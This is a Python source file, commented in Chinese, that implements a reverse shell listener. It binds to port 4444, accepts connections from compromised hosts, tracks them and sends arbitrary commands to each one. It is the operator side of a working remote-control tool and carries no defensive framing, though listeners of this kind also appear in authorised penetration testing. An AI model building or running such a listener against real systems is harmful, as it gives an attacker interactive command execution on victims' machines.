#!/usr/bin/env python3
"""反向连接监听"""
import socket
import threading
import json
from typing import Optional, Callable, Dict
from datetime import datetime

class ReverseListener:
    """反向 Shell 监听器"""

    def __init__(self, host: str = "0.0.0.0", port: int = 4444):
        self.host = host
        self.port = port
        self.socket = None
        self.connections: Dict[str, dict] = {}
        self.running = False
        self.callback: Optional[Callable] = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> str:
        """启动监听"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            self.running = True

            self._thread = threading.Thread(target=self._accept_loop, daemon=True)
            self._thread.start()

            return f"✅ 监听已启动 {self.host}:{self.port}"
        except Exception as e:
            return f"❌ 启动失败: {str(e)}"

    def _accept_loop(self):
        """接受连接循环"""
        while self.running:
            try:
                self.socket.settimeout(1)
                conn, addr = self.socket.accept()

                client_id = f"{addr[0]}:{addr[1]}"
                self.connections[client_id] = {
                    'socket': conn,
                    'address': addr,
                    'connected_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'status': 'active'
                }

                if self.callback:
                    self.callback('connected', client_id, addr)

                # 启动处理线程
                handler = threading.Thread(
                    target=self._handle_client,
                    args=(client_id, conn),
                    daemon=True
                )
                handler.start()

            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"Listener error: {e}")

    def _handle_client(self, client_id: str, conn: socket.socket):
        """处理客户端连接"""
        while self.running and client_id in self.connections:
            try:
                data = conn.recv(4096)
                if not data:
                    break

                if self.callback:
                    self.callback('data', client_id, data.decode('utf-8', errors='ignore'))
            except:
                break

        # 清理连接
        if client_id in self.connections:
            self.connections[client_id]['status'] = 'disconnected'
            if self.callback:
                self.callback('disconnected', client_id, None)

    def send_command(self, client_id: str, command: str) -> bool:
        """发送命令到客户端"""
        if client_id not in self.connections:
            return False

        try:
            conn = self.connections[client_id]['socket']
            conn.send(command.encode() + b'\n')
            return True
        except:
            return False

    def get_connections(self) -> str:
        """获取连接列表"""
        if not self.connections:
            return "📡 无活跃连接"

        lines = ["📡 **活跃连接**\n━━━━━━━━━━━━━━━━━━━━━"]
        for cid, info in self.connections.items():
            if info['status'] == 'active':
                lines.append(f"🟢 `{cid}` | 连接: `{info['connected_at']}`")
        return '\n'.join(lines)

    def stop(self) -> str:
        """停止监听"""
        self.running = False

        for cid, info in list(self.connections.items()):
            try:
                info['socket'].close()
            except:
                pass
        self.connections.clear()

        if self.socket:
            try:
                self.socket.close()
            except:
                pass

        return "🛑 监听已停止"
